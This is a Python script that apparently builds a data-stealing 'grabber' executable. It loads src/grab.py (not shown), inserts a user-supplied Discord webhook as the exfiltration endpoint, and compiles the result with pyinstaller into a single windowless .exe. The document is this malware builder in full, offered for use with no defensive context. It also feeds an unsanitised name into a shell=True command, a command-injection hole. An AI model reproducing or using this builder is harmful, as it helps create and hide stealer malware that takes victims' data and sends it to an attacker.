import subprocess
import os

user = str(os.environ["USERNAME"])

def compile(code, name):
    print("Creating main script...")
    f = open("main.py", "w")
    f.write(code)
    f.close()
    print("Compiling code...")
    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe main.py --onefile --noconsole --name " + name, shell=True)
    print("Compile complete!")

def main():
    name = input(str("Enter name for executable: "))
    webhook = input(str("Enter Discord webhook: "))
    with open("src\\grab.py", "r") as file:
        filedata = file.read()
    code = filedata.replace("webhook123", webhook)
    compile(code, name)

main()
